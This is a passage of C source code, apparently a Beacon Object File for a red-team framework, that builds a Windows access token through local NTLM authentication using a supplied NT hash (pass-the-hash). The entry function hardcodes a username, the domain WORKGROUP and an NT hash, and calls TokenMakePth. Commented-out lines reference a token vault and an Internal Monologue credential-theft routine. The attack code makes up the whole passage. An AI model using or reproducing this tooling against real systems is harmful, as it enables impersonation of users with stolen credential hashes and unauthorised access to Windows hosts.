	if ( ! NT_SUCCESS( status = ServerAcceptAuthenticateToken(
		&authenticateToken,
		&serverCtx,
		&serverCreds,
		&accessToken
	) ) ) {
		PRINTF( "[!] Failed to generate an access token\n" );
		goto END;
	}

	// add to the vault
	/*
	if ( ! NT_SUCCESS( status = TokenAddVault(
		accessToken,
		0,
		username->Buffer,
		domain->Buffer,
		NULL
	) ) ) {
		PRINTF( "[!] Failed to add the token to the vault\n" );
		goto END;
	}
	*/

END:
	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
	if ( challengeToken.pvBuffer ) SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
	if ( authenticateToken.pvBuffer ) SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );

	return status;
}

VOID go(
	IN PCHAR Buffer,
	IN ULONG Length
) {
	UNICODE_STRING username      = INIT_UNICODE_STRING( L"noah" );
	UNICODE_STRING domain        = INIT_UNICODE_STRING( L"WORKGROUP" );
	CHAR           hashString[ ] = "b7b608b19ea2cd47963e58ec9d609a56";
	BYTE           hash[ 16 ]    = { 0 };

	ConvertNtHashStringToBytes( hashString, hash );

	TokenMakePth( &username, &domain, hash );
	//TokenInternalMonologue( FALSE );

	//TokenGetuid( NtCurrentProcessToken() );
};
